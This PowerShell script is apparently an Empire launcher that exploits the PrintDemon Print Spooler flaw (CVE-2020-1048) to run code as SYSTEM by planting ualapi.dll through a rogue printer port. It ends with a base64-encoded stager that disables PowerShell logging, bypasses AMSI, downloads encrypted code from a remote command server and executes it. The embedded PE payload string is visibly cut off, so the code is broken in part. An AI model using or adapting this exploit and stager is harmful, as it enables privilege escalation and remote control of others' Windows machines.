function Invoke-PrintDemon {
<#
    .SYNOPSIS

        This is an Empire launcher PoC using PrintDemon, the CVE-2020-1048
        is a privilege escalation vulnerability that allows a persistent
        threat through Windows Print Spooler. The vulnerability allows an
        unprivileged user to gain system-level privileges. Based on
        @ionescu007 PoC.

        Author: @hubbl3, @Cx01N
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None

    .EXAMPLE

        PS> Invoke-PrintDemon 'vAG4AUAB1CsAJABLACkAKQB8AEkARQBYAA=='

    .LINK

        https://github.com/ionescu007/PrintDemo
        https://stackoverflow.com/questions/4442122/send-raw-zpl-to-zebra-printer-via-usb
        https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1048
#>
param(
     [Parameter()]
     [string]$LauncherCode
 )
$LauncherCode = " kill (Get-Process FXSSVC).Id; Remove-Item -path  C:\Windows\System32\ualapi.dll;" + [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($LauncherCode))

Add-PrinterDriver -Name "Generic / Text Only"
Add-PrinterPort -Name "C:\Windows\system32\ualapi.dll"
Add-Printer -Name "PrintDemon" -DriverName "Generic / Text Only" -PortName "C:\Windows\System32\Ualapi.dll"
Set-Printer PrintDemon -KeepPrintedJobs $true

$Ref = (
"System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
"System.Runtime.InteropServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
);

$MethodDefinition = @"
    using System;
    using System.IO;
    using System.Runtime.InteropServices;

    namespace Printer {

        public class RawPrinterHelper
        {
            // Structure and API declarions:
            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
            public class DOCINFOA
            {
                [MarshalAs(UnmanagedType.LPStr)]
                public string pDocName;
                [MarshalAs(UnmanagedType.LPStr)]
                public string pOutputFile;
                [MarshalAs(UnmanagedType.LPStr)]
                public string pDataType;
            }
            [DllImport("winspool.Drv", EntryPoint = "OpenPrinterA", SetLastError = true, CharSet = CharSet.Ansi, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
            public static extern bool OpenPrinter([MarshalAs(UnmanagedType.LPStr)] string szPrinter, out IntPtr hPrinter, IntPtr pd);

            [DllImport("winspool.Drv", EntryPoint = "ClosePrinter", SetLastError = true, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
            public static extern bool ClosePrinter(IntPtr hPrinter);

            [DllImport("winspool.Drv", EntryPoint = "StartDocPrinterA", SetLastError = true, CharSet = CharSet.Ansi, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
            public static extern bool StartDocPrinter(IntPtr hPrinter, Int32 level, [In, MarshalAs(UnmanagedType.LPStruct)] DOCINFOA di);

            [DllImport("winspool.Drv", EntryPoint = "EndDocPrinter", SetLastError = true, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
            public static extern bool EndDocPrinter(IntPtr hPrinter);

            [DllImport("winspool.Drv", EntryPoint = "StartPagePrinter", SetLastError = true, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
            public static extern bool StartPagePrinter(IntPtr hPrinter);

            [DllImport("winspool.Drv", EntryPoint = "EndPagePrinter", SetLastError = true, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
            public static extern bool EndPagePrinter(IntPtr hPrinter);

            [DllImport("winspool.Drv", EntryPoint = "WritePrinter", SetLastError = true, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
            public static extern bool WritePrinter(IntPtr hPrinter, IntPtr pBytes, Int32 dwCount, out Int32 dwWritten);

            // SendBytesToPrinter()
            // When the function is given a printer name and an unmanaged array
            // of bytes, the function sends those bytes to the print queue.
            // Returns true on success, false on failure.
            public static bool SendBytesToPrinter(string szPrinterName, IntPtr pBytes, Int32 dwCount)
            {
                Int32 dwError = 0, dwWritten = 0;
                IntPtr hPrinter = new IntPtr(0);
                DOCINFOA di = new DOCINFOA();
                bool bSuccess = false; // Assume failure unless you specifically succeed.

                di.pDocName = "My C#.NET RAW Document";
                di.pDataType = "RAW";

                // Open the printer.
                if (OpenPrinter(szPrinterName.Normalize(), out hPrinter, IntPtr.Zero))
                {
                    // Start a document.
                    if (StartDocPrinter(hPrinter, 1, di))
                    {
                        // Start a page.
                        if (StartPagePrinter(hPrinter))
                        {
                            // Write your bytes.
                            bSuccess = WritePrinter(hPrinter, pBytes, dwCount, out dwWritten);
                            EndPagePrinter(hPrinter);
                        }
                        EndDocPrinter(hPrinter);
                    }
                    ClosePrinter(hPrinter);
                }
                // If you did not succeed, GetLastError may give more information
                // about why not.
                if (bSuccess == false)
                {
                    dwError = Marshal.GetLastWin32Error();
                }
                return bSuccess;
            }

            public static bool SendFileToPrinter(string szPrinterName, string szFileName)
            {
                // Open the file.
                FileStream fs = new FileStream(szFileName, FileMode.Open);
                // Create a BinaryReader on the file.
                BinaryReader br = new BinaryReader(fs);
                // Dim an array of bytes big enough to hold the file's contents.
                Byte[] bytes = new Byte[fs.Length];
                bool bSuccess = false;
                // Your unmanaged pointer.
                IntPtr pUnmanagedBytes = new IntPtr(0);
                int nLength;

                nLength = Convert.ToInt32(fs.Length);
                // Read the contents of the file into the array.
                bytes = br.ReadBytes(nLength);
                // Allocate some unmanaged memory for those bytes.
                pUnmanagedBytes = Marshal.AllocCoTaskMem(nLength);
                // Copy the managed byte array into the unmanaged array.
                Marshal.Copy(bytes, 0, pUnmanagedBytes, nLength);
                // Send the unmanaged bytes to the printer.
                bSuccess = SendBytesToPrinter(szPrinterName, pUnmanagedBytes, nLength);
                // Free the unmanaged memory that you allocated earlier.
                Marshal.FreeCoTaskMem(pUnmanagedBytes);
                return bSuccess;
            }
        }
    }
"@;
Add-Type -ReferencedAssemblies $Ref -TypeDefinition $MethodDefinition -Language CSharp;
$PE =  [System.Convert]::FromBase64String('

[IntPtr] $unmanaged = ([system.runtime.interopservices.marshal]::AllocHGlobal($pe.Length));
[system.runtime.interopservices.marshal]::Copy($PE, 0, $unmanaged, $PE.Length);
[Printer.RawPrinterHelper]::SendBytesToPrinter("PrintDemon", $unmanaged, $PE.Length);
#<Registry Persistence>
Restart-PrintJob PrintDemon (Get-PrintJob PrintDemon).Id;
sc.exe start Fax;

$FTPServer = "localhost";
$FTPPort = "9299";

$tcpConnection = New-Object System.Net.Sockets.TcpClient($FTPServer, $FTPPort);
$tcpStream = $tcpConnection.GetStream();
$reader = New-Object System.IO.StreamReader($tcpStream);
$writer = New-Object System.IO.StreamWriter($tcpStream);
$writer.AutoFlush = $true;
$commands = @( "`r",$LauncherCode,"`r" );

while ($tcpConnection.Connected)
{
    while ($tcpStream.DataAvailable)
    {
        $reader.ReadLine();
    }

    if ($tcpConnection.Connected)
    {
        For (i=0; i -lt 5; i++){
            ForEach ($str in $commands){
                Start-Sleep -s 5;
                $command = $str;
                $writer.WriteLine($command) | Out-Null
            }
        }
    }
}

$reader.Close()
$writer.Close()
$tcpConnection.Close()
}

Invoke-PrintDemon 'SQBmACgAJABQAFMAVgBFAHIAcwBpAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBlAFIAUwBJAE8ATgAuAE0AYQBKAE8AUgAgAC0ARwBFACAAMwApAHsAJABCADcARgA0AD0AWwBSAEUAZgBdAC4AQQBTAHMARQBtAEIAbABZAC4ARwBFAFQAVAB5AFAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBlAGAATABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkAGIANwBGADQAKQB7ACQAYgAzADkAOQA9ACQAYgA3AGYANAAuAEcAZQB0AFYAQQBsAHUAZQAoACQAbgBVAEwAbAApADsASQBGACgAJABiADMAOQA5AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAYgAzADkAOQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABiADMAOQA5AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAEwAPQBbAEMATwBMAGwAZQBjAHQASQBPAG4AcwAuAEcARQBOAGUAcgBJAGMALgBEAGkAQwBUAEkATwBOAGEAUgB5AFsAcwB0AFIASQBuAEcALABTAHkAUwB0AEUAbQAuAE8AQgBKAGUAQwB0AF0AXQA6ADoATgBFAFcAKAApADsAJABWAEEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AEEAbAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGIAMwA5ADkAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBBAEwAfQBFAEwAUwBlAHsAWwBTAEMAUgBpAHAAdABCAEwAbwBjAGsAXQAuACIARwBFAHQARgBpAEUAYABMAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAQQBMAFUAZQAoACQAbgBVAEwAbAAsACgATgBFAFcALQBPAGIASgBFAEMAdAAgAEMAbwBMAEwAZQBjAFQAaQBPAE4AcwAuAEcARQBuAEUAUgBJAGMALgBIAGEAcwBoAFMARQBUAFsAUwBUAHIAaQBuAEcAXQApACkAfQAkAFIARQBmAD0AWwBSAEUAZgBdAC4AQQBzAFMARQBtAEIAbABZAC4ARwBlAFQAVAB5AFAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAEYALgBHAGUAdABGAGkAZQBMAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAQQBsAFUARQAoACQAbgBVAGwAbAAsACQAdABSAFUARQApADsAfQA7AFsAUwB5AFMAVABlAE0ALgBOAGUAVAAuAFMAZQBSAFYAaQBjAGUAUABPAGkAbgB0AE0AYQBuAEEARwBFAFIAXQA6ADoARQB4AFAAZQBDAHQAMQAwADAAQwBvAE4AdABJAE4AVQBlAD0AMAA7ACQARQBCAEQAZAA9AE4ARQB3AC0ATwBCAGoARQBjAHQAIABTAFkAUwBUAGUATQAuAE4AZQB0AC4AVwBFAGIAQwBMAGkAZQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AFQALgBFAG4AQwBPAGQASQBOAEcAXQA6ADoAVQBuAGkAQwBPAEQARQAuAEcAZQBUAFMAdABSAEkAbgBnACgAWwBDAE8AbgB2AGUAcgBUAF0AOgA6AEYAcgBPAG0AQgBBAFMARQA2ADQAUwB0AHIASQBuAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAawBBAE0AZwBBAHUAQQBEAEUAQQBOAGcAQQA0AEEAQwA0AEEATQBRAEEAegBBAEQAawBBAEwAZwBBADIAQQBEAEkAQQBPAGcAQQA0AEEARABBAEEATwBBAEEAdwBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkAGUAQgBkAEQALgBIAEUAYQBEAGUAcgBzAC4AQQBkAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABlAEIARABEAC4AUAByAE8AWABZAD0AWwBTAHkAUwBUAGUATQAuAE4AZQBUAC4AVwBFAGIAUgBFAHEAVQBlAHMAdABdADoAOgBEAGUAZgBBAHUAbAB0AFcARQBCAFAAcgBvAHgAWQA7ACQAZQBiAEQARAAuAFAAcgBvAHgAeQAuAEMAcgBlAGQARQBuAFQASQBBAEwAcwAgAD0AIABbAFMAeQBTAFQARQBtAC4ATgBFAHQALgBDAFIAZQBkAGUATgBUAEkAQQBMAEMAYQBjAEgAZQBdADoAOgBEAGUARgBhAHUAbABUAE4AZQBUAHcAbwBSAGsAQwBSAEUAZABlAG4AVABJAGEAbABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAGUAYgBkAGQALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBTAFQAZQBtAC4AVABFAHgAVAAuAEUAbgBjAG8AZABJAE4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAVABCAHkAdABFAFMAKAAnACoAOwA1ADQAWwBpADkAPQBqAE4AfQBFAFUAcwBtAHwAUwBoACkANgB3AHYAegBEAGsAPgBIACwATQBiADAAOgAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMATwB1AE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAHgAbwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAGUAYgBEAGQALgBIAEUAYQBkAGUAcgBTAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAGQASQByAFUAVABSAHMAPQBQADAARgBhAGYAaQBaAHcAUAB3AFMAUwBDAC8AQQBtACsAcAB1AFYAVABCAFEAZQBtAGUAWQA9ACIAKQA7ACQAZABhAFQAQQA9ACQARQBCAEQARAAuAEQATwBXAE4ATABPAGEAZABEAEEAdABhACgAJABzAGUAUgArACQAdAApADsAJABpAFYAPQAkAEQAQQB0AGEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAEQAYQBUAEEAWwA0AC4ALgAkAGQAYQB0AEEALgBMAGUATgBnAHQASABdADsALQBqAG8AaQBuAFsAQwBIAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAQQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA=='
